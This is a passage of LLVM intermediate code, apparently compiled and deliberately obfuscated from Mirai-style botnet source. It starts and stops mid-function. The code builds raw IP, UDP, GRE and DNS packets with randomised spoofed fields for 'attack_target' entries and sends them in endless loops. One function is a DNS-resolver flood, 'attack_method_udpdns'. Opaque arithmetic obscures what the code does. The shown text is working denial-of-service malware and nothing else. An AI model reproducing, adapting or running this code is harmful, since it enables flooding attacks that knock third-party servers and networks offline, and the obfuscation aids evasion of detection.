; <label>:214:                                    ; preds = %350, %213
  store i32 0, i32* %9, align 4
  br label %215

; <label>:215:                                    ; preds = %344, %214
  %216 = load i32, i32* %9, align 4
  %217 = load i8, i8* %5, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp slt i32 %216, %218
  br i1 %219, label %220, label %350

; <label>:220:                                    ; preds = %215
  %221 = load i8**, i8*** %11, align 8
  %222 = load i32, i32* %9, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i8*, i8** %221, i64 %223
  %225 = load i8*, i8** %224, align 8
  store i8* %225, i8** %23, align 8
  %226 = load i8*, i8** %23, align 8
  %227 = bitcast i8* %226 to %struct.iphdr*
  store %struct.iphdr* %227, %struct.iphdr** %24, align 8
  %228 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i64 1
  %230 = bitcast %struct.iphdr* %229 to %struct.udphdr*
  store %struct.udphdr* %230, %struct.udphdr** %25, align 8
  %231 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %232 = load i32, i32* %9, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i64 %233
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i32 0, i32 2
  %236 = load i8, i8* %235, align 4
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %237, 32
  br i1 %238, label %239, label %263

; <label>:239:                                    ; preds = %220
  %240 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 1
  %245 = load i32, i32* %244, align 4
  %246 = call i32 @ntohl(i32 %245) #7
  %247 = call i32 @rand_next()
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i32 0, i32 2
  %253 = load i8, i8* %252, align 4
  %254 = zext i8 %253 to i32
  %255 = lshr i32 %247, %254
  %256 = add i32 %246, 538760720
  %257 = add i32 %256, %255
  %258 = sub i32 %257, 538760720
  %259 = add i32 %246, %255
  %260 = call i32 @htonl(i32 %258) #7
  %261 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 9
  store i32 %260, i32* %262, align 4
  br label %263

; <label>:263:                                    ; preds = %239, %220
  %264 = load i16, i16* %13, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp eq i32 %265, 65535
  br i1 %266, label %267, label %272

; <label>:267:                                    ; preds = %263
  %268 = call i32 @rand_next()
  %269 = trunc i32 %268 to i16
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 3
  store i16 %269, i16* %271, align 4
  br label %272

; <label>:272:                                    ; preds = %267, %263
  %273 = load i16, i16* %16, align 2
  %274 = zext i16 %273 to i32
  %275 = icmp eq i32 %274, 65535
  br i1 %275, label %276, label %281

; <label>:276:                                    ; preds = %272
  %277 = call i32 @rand_next()
  %278 = trunc i32 %277 to i16
  %279 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %280 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %279, i32 0, i32 0
  store i16 %278, i16* %280, align 2
  br label %281

; <label>:281:                                    ; preds = %276, %272
  %282 = load i16, i16* %17, align 2
  %283 = zext i16 %282 to i32
  %284 = icmp eq i32 %283, 65535
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %281
  %286 = call i32 @rand_next()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 1
  store i16 %287, i16* %289, align 2
  br label %290

; <label>:290:                                    ; preds = %285, %281
  %291 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 7
  store i16 0, i16* %292, align 2
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = bitcast %struct.iphdr* %293 to i16*
  %295 = call zeroext i16 @checksum_generic(i16* %294, i32 20)
  %296 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 7
  store i16 %295, i16* %297, align 2
  %298 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 3
  store i16 0, i16* %299, align 2
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %302 = bitcast %struct.udphdr* %301 to i8*
  %303 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 2
  %305 = load i16, i16* %304, align 2
  %306 = load i32, i32* %19, align 4
  %307 = sext i32 %306 to i64
  %308 = add i64 12, 2413578004119144059
  %309 = add i64 %308, %307
  %310 = sub i64 %309, 2413578004119144059
  %311 = add i64 12, %307
  %312 = trunc i64 %310 to i32
  %313 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %300, i8* %302, i16 zeroext %305, i32 %312)
  %314 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 3
  store i16 %313, i16* %315, align 2
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 1
  %318 = load i16, i16* %317, align 2
  %319 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 0
  %324 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %323, i32 0, i32 1
  store i16 %318, i16* %324, align 2
  %325 = load i32, i32* %10, align 4
  %326 = load i8*, i8** %23, align 8
  %327 = load i32, i32* %19, align 4
  %328 = sext i32 %327 to i64
  %329 = sub i64 0, 32
  %330 = sub i64 0, %328
  %331 = add i64 %329, %330
  %332 = sub i64 0, %331
  %333 = add i64 32, %328
  %334 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %335 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %336 = load i32, i32* %9, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %335, i64 %337
  %339 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i32 0, i32 0
  %340 = bitcast %struct.sockaddr_in* %339 to %struct.sockaddr*
  store %struct.sockaddr* %340, %struct.sockaddr** %334, align 8
  %341 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %342 = load %struct.sockaddr*, %struct.sockaddr** %341, align 8
  %343 = call i64 @sendto(i32 %325, i8* %326, i64 %332, i32 16384, %struct.sockaddr* %342, i32 16)
  br label %344

; <label>:344:                                    ; preds = %290
  %345 = load i32, i32* %9, align 4
  %346 = sub i32 %345, -1587538860
  %347 = add i32 %346, 1
  %348 = add i32 %347, -1587538860
  %349 = add nsw i32 %345, 1
  store i32 %348, i32* %9, align 4
  br label %215

; <label>:350:                                    ; preds = %215
  br label %214

; <label>:351:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %521

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %521

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %521

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %323, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %329

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = xor i8 %124, -1
  %126 = xor i8 15, -1
  %127 = xor i8 -43, -1
  %128 = or i8 %125, %126
  %129 = or i8 -43, %127
  %130 = xor i8 %128, -1
  %131 = and i8 %130, %129
  %132 = and i8 %124, 15
  %133 = xor i8 %131, -1
  %134 = xor i8 64, -1
  %135 = xor i8 102, -1
  %136 = and i8 %133, 102
  %137 = and i8 %131, %135
  %138 = and i8 %134, 102
  %139 = and i8 64, %135
  %140 = or i8 %136, %137
  %141 = or i8 %138, %139
  %142 = xor i8 %140, %141
  %143 = or i8 %133, %134
  %144 = xor i8 %143, -1
  %145 = or i8 102, %135
  %146 = and i8 %144, %145
  %147 = or i8 %142, %146
  %148 = or i8 %131, 64
  store i8 %147, i8* %123, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = xor i8 %151, -1
  %153 = xor i8 -16, -1
  %154 = xor i8 -120, -1
  %155 = or i8 %152, %153
  %156 = or i8 -120, %154
  %157 = xor i8 %155, -1
  %158 = and i8 %157, %156
  %159 = and i8 %151, -16
  %160 = and i8 %158, 5
  %161 = xor i8 %158, 5
  %162 = or i8 %160, %161
  %163 = or i8 %158, 5
  store i8 %162, i8* %150, align 4
  %164 = load i8, i8* %12, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 1
  store i8 %164, i8* %166, align 1
  %167 = load i8, i8* %19, align 1
  %168 = zext i8 %167 to i64
  %169 = sub i64 0, %168
  %170 = sub i64 41, %169
  %171 = add i64 41, %168
  %172 = sub i64 0, 2
  %173 = sub i64 %170, %172
  %174 = add i64 %170, 2
  %175 = load i32, i32* %21, align 4
  %176 = sext i32 %175 to i64
  %177 = sub i64 0, %176
  %178 = sub i64 %173, %177
  %179 = add i64 %173, %176
  %180 = sub i64 0, 4
  %181 = sub i64 %178, %180
  %182 = add i64 %178, 4
  %183 = trunc i64 %181 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %13, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %101
  %197 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

; <label>:200:                                    ; preds = %196, %101
  %201 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 17, i8* %202, align 1
  %203 = load i32, i32* @LOCAL_ADDR, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load i32, i32* %22, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  store i32 %206, i32* %208, align 4
  %209 = load i16, i16* %16, align 2
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  store i16 %210, i16* %212, align 2
  %213 = load i16, i16* %17, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 1
  store i16 %214, i16* %216, align 2
  %217 = load i8, i8* %19, align 1
  %218 = zext i8 %217 to i64
  %219 = add i64 21, -2043964311956035875
  %220 = add i64 %219, %218
  %221 = sub i64 %220, -2043964311956035875
  %222 = add i64 21, %218
  %223 = sub i64 %221, -5725761528776095204
  %224 = add i64 %223, 2
  %225 = add i64 %224, -5725761528776095204
  %226 = add i64 %221, 2
  %227 = load i32, i32* %21, align 4
  %228 = sext i32 %227 to i64
  %229 = sub i64 0, %225
  %230 = sub i64 0, %228
  %231 = add i64 %229, %230
  %232 = sub i64 0, %231
  %233 = add i64 %225, %228
  %234 = add i64 %232, 4669478404860659288
  %235 = add i64 %234, 4
  %236 = sub i64 %235, 4669478404860659288
  %237 = add i64 %232, 4
  %238 = trunc i64 %236 to i16
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %241 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %240, i32 0, i32 2
  store i16 %239, i16* %241, align 2
  %242 = load i16, i16* %18, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %245 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %244, i32 0, i32 0
  store i16 %243, i16* %245, align 2
  %246 = call zeroext i16 @htons(i16 zeroext 256) #7
  %247 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %248 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %247, i32 0, i32 1
  store i16 %246, i16* %248, align 2
  %249 = call zeroext i16 @htons(i16 zeroext 1) #7
  %250 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %251 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  %252 = load i8, i8* %19, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 %252, i8* %253, align 1
  %255 = load i8, i8* %19, align 1
  %256 = zext i8 %255 to i32
  %257 = load i8*, i8** %29, align 8
  %258 = sext i32 %256 to i64
  %259 = getelementptr inbounds i8, i8* %257, i64 %258
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  store i8* %260, i8** %30, align 8
  %261 = load i8*, i8** %29, align 8
  %262 = getelementptr inbounds i8, i8* %261, i64 1
  %263 = load i8*, i8** %20, align 8
  %264 = load i32, i32* %21, align 4
  %265 = sub i32 0, %264
  %266 = sub i32 0, 1
  %267 = add i32 %265, %266
  %268 = sub i32 0, %267
  %269 = add nsw i32 %264, 1
  call void @util_memcpy(i8* %262, i8* %263, i32 %268)
  store i32 0, i32* %23, align 4
  br label %270

; <label>:270:                                    ; preds = %302, %200
  %271 = load i32, i32* %23, align 4
  %272 = load i32, i32* %21, align 4
  %273 = icmp slt i32 %271, %272
  br i1 %273, label %274, label %308

; <label>:274:                                    ; preds = %270
  %275 = load i8*, i8** %20, align 8
  %276 = load i32, i32* %23, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds i8, i8* %275, i64 %277
  %279 = load i8, i8* %278, align 1
  %280 = sext i8 %279 to i32
  %281 = icmp eq i32 %280, 46
  br i1 %281, label %282, label %296

; <label>:282:                                    ; preds = %274
  %283 = load i8, i8* %24, align 1
  %284 = load i8*, i8** %30, align 8
  store i8 %283, i8* %284, align 1
  store i8 0, i8* %24, align 1
  %285 = load i8, i8* %25, align 1
  %286 = sub i8 0, %285
  %287 = sub i8 0, 1
  %288 = add i8 %286, %287
  %289 = sub i8 0, %288
  %290 = add i8 %285, 1
  store i8 %289, i8* %25, align 1
  %291 = load i8*, i8** %29, align 8
  %292 = load i32, i32* %23, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds i8, i8* %291, i64 %293
  %295 = getelementptr inbounds i8, i8* %294, i64 1
  store i8* %295, i8** %30, align 8
  br label %301

; <label>:296:                                    ; preds = %274
  %297 = load i8, i8* %24, align 1
  %298 = sub i8 0, 1
  %299 = sub i8 %297, %298
  %300 = add i8 %297, 1
  store i8 %299, i8* %24, align 1
  br label %301

; <label>:301:                                    ; preds = %296, %282
  br label %302

; <label>:302:                                    ; preds = %301
  %303 = load i32, i32* %23, align 4
  %304 = add i32 %303, -877450709
  %305 = add i32 %304, 1
  %306 = sub i32 %305, -877450709
  %307 = add nsw i32 %303, 1
  store i32 %306, i32* %23, align 4
  br label %270

; <label>:308:                                    ; preds = %270
  %309 = load i8, i8* %24, align 1
  %310 = load i8*, i8** %30, align 8
  store i8 %309, i8* %310, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = load i32, i32* %21, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds i8, i8* %311, i64 %313
  %315 = getelementptr inbounds i8, i8* %314, i64 2
  %316 = bitcast i8* %315 to %struct.grehdr*
  store %struct.grehdr* %316, %struct.grehdr** %31, align 8
  %317 = call zeroext i16 @htons(i16 zeroext 1) #7
  %318 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %319 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %318, i32 0, i32 0
  store i16 %317, i16* %319, align 2
  %320 = call zeroext i16 @htons(i16 zeroext 1) #7
  %321 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %322 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %321, i32 0, i32 1
  store i16 %320, i16* %322, align 2
  br label %323

; <label>:323:                                    ; preds = %308
  %324 = load i32, i32* %9, align 4
  %325 = sub i32 %324, 618830222
  %326 = add i32 %325, 1
  %327 = add i32 %326, 618830222
  %328 = add nsw i32 %324, 1
  store i32 %327, i32* %9, align 4
  br label %96

; <label>:329:                                    ; preds = %96
  br label %330

; <label>:330:                                    ; preds = %520, %329
  store i32 0, i32* %9, align 4
  br label %331

; <label>:331:                                    ; preds = %514, %330
  %332 = load i32, i32* %9, align 4
  %333 = load i8, i8* %5, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp slt i32 %332, %334
  br i1 %335, label %336, label %520

; <label>:336:                                    ; preds = %331
  %337 = load i8**, i8*** %11, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds i8*, i8** %337, i64 %339
  %341 = load i8*, i8** %340, align 8
  store i8* %341, i8** %32, align 8
  %342 = load i8*, i8** %32, align 8
  %343 = bitcast i8* %342 to %struct.iphdr*
  store %struct.iphdr* %343, %struct.iphdr** %33, align 8
  %344 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i64 1
  %346 = bitcast %struct.iphdr* %345 to %struct.udphdr*
  store %struct.udphdr* %346, %struct.udphdr** %34, align 8
  %347 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i64 1
  %349 = bitcast %struct.udphdr* %348 to %struct.dnshdr*
  store %struct.dnshdr* %349, %struct.dnshdr** %35, align 8
  %350 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %351 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %350, i64 1
  %352 = bitcast %struct.dnshdr* %351 to i8*
  %353 = getelementptr inbounds i8, i8* %352, i64 1
  store i8* %353, i8** %36, align 8
  %354 = load i16, i16* %13, align 2
  %355 = zext i16 %354 to i32
  %356 = icmp eq i32 %355, 65535
  br i1 %356, label %357, label %370

; <label>:357:                                    ; preds = %336
  %358 = call i32 @rand_next()
  %359 = xor i32 %358, -1
  %360 = xor i32 65535, -1
  %361 = xor i32 -1314007425, -1
  %362 = or i32 %359, %360
  %363 = or i32 -1314007425, %361
  %364 = xor i32 %362, -1
  %365 = and i32 %364, %363
  %366 = and i32 %358, 65535
  %367 = trunc i32 %365 to i16
  %368 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 3
  store i16 %367, i16* %369, align 4
  br label %370

; <label>:370:                                    ; preds = %357, %336
  %371 = load i16, i16* %16, align 2
  %372 = zext i16 %371 to i32
  %373 = icmp eq i32 %372, 65535
  br i1 %373, label %374, label %387

; <label>:374:                                    ; preds = %370
  %375 = call i32 @rand_next()
  %376 = xor i32 %375, -1
  %377 = xor i32 65535, -1
  %378 = xor i32 1279687370, -1
  %379 = or i32 %376, %377
  %380 = or i32 1279687370, %378
  %381 = xor i32 %379, -1
  %382 = and i32 %381, %380
  %383 = and i32 %375, 65535
  %384 = trunc i32 %382 to i16
  %385 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %386 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %385, i32 0, i32 0
  store i16 %384, i16* %386, align 2
  br label %387

; <label>:387:                                    ; preds = %374, %370
  %388 = load i16, i16* %17, align 2
  %389 = zext i16 %388 to i32
  %390 = icmp eq i32 %389, 65535
  br i1 %390, label %391, label %404

; <label>:391:                                    ; preds = %387
  %392 = call i32 @rand_next()
  %393 = xor i32 %392, -1
  %394 = xor i32 65535, -1
  %395 = xor i32 -1188223644, -1
  %396 = or i32 %393, %394
  %397 = or i32 -1188223644, %395
  %398 = xor i32 %396, -1
  %399 = and i32 %398, %397
  %400 = and i32 %392, 65535
  %401 = trunc i32 %399 to i16
  %402 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 1
  store i16 %401, i16* %403, align 2
  br label %404

; <label>:404:                                    ; preds = %391, %387
  %405 = load i16, i16* %18, align 2
  %406 = zext i16 %405 to i32
  %407 = icmp eq i32 %406, 65535
  br i1 %407, label %408, label %421

; <label>:408:                                    ; preds = %404
  %409 = call i32 @rand_next()
  %410 = xor i32 %409, -1
  %411 = xor i32 65535, -1
  %412 = xor i32 111079584, -1
  %413 = or i32 %410, %411
  %414 = or i32 111079584, %412
  %415 = xor i32 %413, -1
